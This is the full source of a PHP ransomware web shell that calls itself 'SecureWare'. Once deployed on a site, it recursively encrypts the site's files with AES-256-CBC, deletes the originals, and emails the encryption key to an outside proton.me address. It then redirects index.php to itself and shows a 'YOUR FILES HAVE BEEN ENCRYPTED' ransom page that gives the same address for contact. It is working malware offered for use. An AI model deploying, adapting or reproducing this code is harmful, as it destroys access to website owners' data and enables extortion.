<?php
function isSiteEncrypted($dir) {
    foreach (scandir($dir) as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $entry;
        if (is_dir($path)) {
            if (isSiteEncrypted($path)) return true;
        } elseif (substr($entry, -4) === '.enc') {
            return true;
        }
    }
    return false;
}

class SecureEncrypter
{
    private static $cipher = 'AES-256-CBC';

    public static function isEncrypted($dir)
    {
        foreach (scandir($dir) as $d) {
            if ($d != '.' && $d != '..') {
                $path = $dir . DIRECTORY_SEPARATOR . $d;
                if (is_dir($path)) {
                    if (self::isEncrypted($path))
                        return true;
                } else {
                    if (substr($d, -4) === '.enc')
                        return true;
                }
            }
        }
        return false;
    }

    public static function locate()
    {
        return getcwd();
    }

    public static function encryptDecryptDirs($dir, $method, $key)
    {
        $emailsent = false;
        foreach (scandir($dir) as $d) {
            if ($d != '.' && $d != '..') {
                $locate = $dir . DIRECTORY_SEPARATOR . $d;
                if (!is_dir($locate)) {
                    if (self::excludeFile($locate)) {
                        switch ($method) {
                            case '1':
                                if (!$emailsent) {
                                    self::sendKeyEmail($key);
                                    $emailsent = true;
                                }
                                self::encryptFile($key, $locate);
                                break;
                            case '2':
                                self::decryptFile($key, $locate);
                                break;
                        }
                    }
                } else {
                    self::encryptDecryptDirs($locate, $method, $key);
                }
                flush();
                ob_flush();
            }
        }
    }

    private static function excludeFile($file)
    {
        $excluded = [
            'index.php',
            basename(__FILE__),
            'wp-security.php',
            '.htaccess'
        ];
        foreach ($excluded as $ex) {
            if (stripos($file, $ex) !== false)
                return false;
        }
        return true;
    }

    public static function encryptFile($key, $filePath)
    {
        if (substr($filePath, -4) === '.enc')
            return;

        $data = file_get_contents($filePath);
        $ivLen = openssl_cipher_iv_length(self::$cipher);
        $iv = openssl_random_pseudo_bytes($ivLen);
        $encrypted = openssl_encrypt($data, self::$cipher, $key, OPENSSL_RAW_DATA, $iv);

        if ($encrypted !== false) {
            $encData = base64_encode($iv . $encrypted);
            if (file_put_contents($filePath . '.enc', $encData))
                unlink($filePath);
        }
    }

    public static function decryptFile($key, $filePath)
    {
        if (substr($filePath, -4) !== '.enc')
            return;

        $data = base64_decode(file_get_contents($filePath));
        $ivLen = openssl_cipher_iv_length(self::$cipher);
        $iv = substr($data, 0, $ivLen);
        $ciphertext = substr($data, $ivLen);
        $decrypted = openssl_decrypt($ciphertext, self::$cipher, $key, OPENSSL_RAW_DATA, $iv);

        if ($decrypted !== false) {
            $originalFile = substr($filePath, 0, -4);
            if (file_put_contents($originalFile, $decrypted))
                unlink($filePath);
        }
    }

    public static function sendKeyEmail($key)
    {
        $siteURL = "https://" . $_SERVER['HTTP_HOST'];
        $subject = "Site Encryption Key Report";
        $message = "Your website at $siteURL started encryption.\nEncryption Key: $key";
        $headers = "From: noreply@" . $_SERVER['HTTP_HOST'] . "\r\n";

        $to = "important_anonymous_warn@proton.me"; 
        @mail($to, $subject, $message, $headers);
    }

    public static function replaceIndexWithRedirect($redirectFile = 'wp-security.php') {
        $indexPath = self::locate() . DIRECTORY_SEPARATOR . 'index.php';
        $backupPath = $indexPath . '.bak';
        if (file_exists($indexPath) && !file_exists($backupPath)) {
            copy($indexPath, $backupPath);
        }
        $newIndexContent = <<<PHP
<?php
header('Location: /$redirectFile');
exit;
PHP;

        file_put_contents($indexPath, $newIndexContent);
    }

    public static function restoreOriginalIndex() {
        $indexPath = self::locate() . DIRECTORY_SEPARATOR . 'index.php';
        $backupPath = $indexPath . '.bak';

        if (file_exists($backupPath)) {
            copy($backupPath, $indexPath);
            unlink($backupPath);
        }
    }
}

if (isset($_POST['submit'])) {
    $key = trim($_POST['key'] ?? '');
    $method = $_POST['method'] ?? '';
    $fileName = basename(__FILE__);

    if (!empty($key)) {
        switch ($method) {
            case '1': 
                SecureEncrypter::encryptDecryptDirs(SecureEncrypter::locate(), '1', $key);
                SecureEncrypter::replaceIndexWithRedirect($fileName);
                break;
            case '2': 
                $encFile = $fileName . '.enc';
                if (file_exists($encFile)) {
                    SecureEncrypter::decryptFile($key, $encFile);
                }
                SecureEncrypter::restoreOriginalIndex();
                SecureEncrypter::encryptDecryptDirs(SecureEncrypter::locate(), '2', $key);
                break;
        }
    }
}
?>
<!DOCTYPE html>
<html>
  <head>
    <title>SecureWare - Site Maintenance</title>
    <style>
      body {
        background: #1a1c1f;
        color: #e2e2e2;
        font-family: monospace;
      }
      .inpute {
        border-style: dotted;
        border-color: #379600;
        background: transparent;
        color: white;
        text-align: center;
        padding: 10px;
      }
      .selecte {
        border-style: dotted;
        border-color: green;
        background: transparent;
        color: green;
        padding: 10px;
      }
      .submite {
        border-style: dotted;
        border-color: #4caf50;
        background: transparent;
        color: white;
        padding: 10px 20px;
        cursor: pointer;
      }
      .result {
        text-align: left;
        margin: 20px auto;
        max-width: 900px;
      }
      h1 {
        text-align: center;
        font-weight: normal;
      }
    </style>
    <link
      rel="stylesheet"
      href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css"
    />
  </head>
  <body>
    <div class="result">
      <center>
        <pre>

▗▖ ▗▖ ▗▄▖  ▗▄▄▖▗▖ ▗▖▗▄▄▄▖▗▄▄▄ 
▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌▗▞▘▐▌   ▐▌  █
▐▛▀▜▌▐▛▀▜▌▐▌   ▐▛▚▖ ▐▛▀▀▘▐▌  █
▐▌ ▐▌▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌▐▙▄▄▖▐▙▄▄▀
                              
                              
        For key encrypt/decrypt of site files email me at important_anonymous_warn@proton.me
        </pre>
        <div
          style="
            background-color: #1a1c1f;
            color: #ff4136;
            padding: 30px;
            border: 2px solid #ff4136;
            border-radius: 20px;
            font-family: monospace;
            text-align: center;
          "
        >
          <h1 style="font-size: 48px; margin-bottom: 20px">
            ⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️
          </h1>
          <p style="font-size: 18px">
            All your important files have been locked.
          </p>
          <p style="font-size: 18px">
            To regain access, you must provide the correct decryption key.
          </p>
          <hr style="border: 1px solid #ff4136; margin: 20px 0" />
          <p style="font-size: 16px">
            Your Data is <strong>Safe </strong> with us. We respect your privacy.
          </p>
          <p style="font-size: 14px; color: #ffdc00">
            For key encrypt/decrypt of site files email me at important_anonymous_warn@proton.me
          </p>
        </div>
        <h1>Hacked!</h1>
        <form action="" method="post" style="text-align: center">
          <label>Key: </label>
          <input
            type="text"
            name="key"
            class="inpute"
            placeholder="KEY ENC/DEC"
            required
          />
          <select name="method" class="selecte" required>
            <option value="1">Encrypt (Lock Site)</option>
            <option value="2">Decrypt (Unlock Site)</option>
          </select>
          <input type="submit" name="submit" class="submite" value="Submit" />
        </form>
      </center>
      <hr style="border-color: #444" />
    </div>
  </body>
</html>
